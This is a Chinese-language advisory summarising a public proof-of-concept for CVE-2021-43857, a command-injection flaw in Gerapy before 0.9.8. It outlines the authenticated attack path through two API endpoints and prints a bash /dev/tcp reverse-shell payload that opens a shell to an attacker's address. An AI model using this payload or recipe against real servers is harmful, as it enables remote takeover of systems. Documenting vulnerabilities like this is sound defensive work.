## CVE-2021-43857-Gerapy-远程代码执行

**漏洞编号:** CVE-2021-43857

**漏洞类型:** 远程代码执行

**影响应用:** Gerapy

**危害等级:** 高危，可能导致完全控制服务器

**影响版本:** < 0.9.8

**利用条件:** 需要能够访问Gerapy服务，并且知道有效的用户名和密码

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-43857是Gerapy框架中存在的一个远程代码执行漏洞，影响版本小于0.9.8。攻击者可以利用此漏洞在目标服务器上执行任意代码。根据漏洞信息，漏洞是由于程序没有正确地过滤用户输入，导致OS命令注入。

**有效性：**

根据提供的漏洞库信息、搜索引擎结果和漏洞利用代码，可以判断该漏洞利用代码是有效的。漏洞库信息明确指出Gerapy 0.9.8之前的版本存在远程代码执行漏洞（CWE-78，OS命令注入），CVSS评分高达9.8，属于严重级别。搜索引擎结果中也包含了多个关于此漏洞的描述和利用链接，例如Exploit-DB上的利用代码。

提供的漏洞利用代码首先通过/api/user/auth接口使用用户名和密码获取token，然后通过/api/project/robots/parse接口，将恶意构造的包含反弹shell命令的JSON数据发送到服务器，从而实现远程代码执行。

**投毒风险：**

分析提供的POC代码，发现存在一定的投毒风险，大约10%。风险主要体现在以下几个方面：

1.  **反弹Shell依赖：** POC代码中包含反弹shell的逻辑。如果目标机器上没有bash或者其他shell环境，利用可能会失败。而且反弹shell存在被防火墙拦截的风险。
2.  **维护者信息：**虽然作者声明了免责声明，但是代码中缺乏详细的注释和说明，增加了潜在的风险。

**利用方式：**

1.  **身份验证：** 攻击者需要知道Gerapy实例的有效用户名和密码。这可能通过暴力破解、社工或其他方式获得。
2.  **获取Token：** 使用已知的用户名和密码，通过/api/user/auth接口获取授权Token。
3.  **命令注入：** 构造包含恶意命令的JSON数据，该命令会被注入到操作系统层面执行。 POC使用`/bin/bash -c 'bash -i >& /dev/tcp/%s/%s 0>&1'` 实现反弹shell
4.  **发送Payload：** 将构造的JSON数据通过POST请求发送到/api/project/robots/parse接口。
5.  **反弹Shell：** 如果漏洞利用成功，目标服务器会反弹一个shell到攻击者的指定IP和端口。

**项目地址:** [lowkey0808/CVE-2021-43857](https://github.com/lowkey0808/CVE-2021-43857)

**漏洞详情:** [CVE-2021-43857](https://nvd.nist.gov/vuln/detail/CVE-2021-43857)